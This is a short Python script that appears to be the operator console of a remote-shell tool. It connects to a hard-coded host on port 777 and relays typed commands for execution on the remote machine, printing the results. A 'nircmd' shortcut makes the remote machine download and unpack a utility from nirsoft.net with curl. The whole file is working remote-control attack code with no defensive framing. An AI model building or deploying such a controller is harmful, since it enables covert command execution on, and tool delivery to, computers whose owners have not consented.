import os
import socket

TARGET = "172.20.10.5"

TARGET_PORT = 777

cwd = "cd"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((TARGET, TARGET_PORT))
while True:
    s.sendall(cwd.encode())

    current_dir = s.recv(8000).decode().strip()

    command = input(current_dir + "> ")

    if command == "cls":
        os.system("cls")
    elif command == "exit":
        break
    elif command == "nircmd":
        download = "curl https://www.nirsoft.net/utils/nircmd.zip -o nircmd.zip && tar -xf nircmd.zip && del nircmd.zip"
        s.sendall(download.encode())
    else:
        s.send(command.encode())

        output = s.recv(8000)
        print("\n", output.decode())
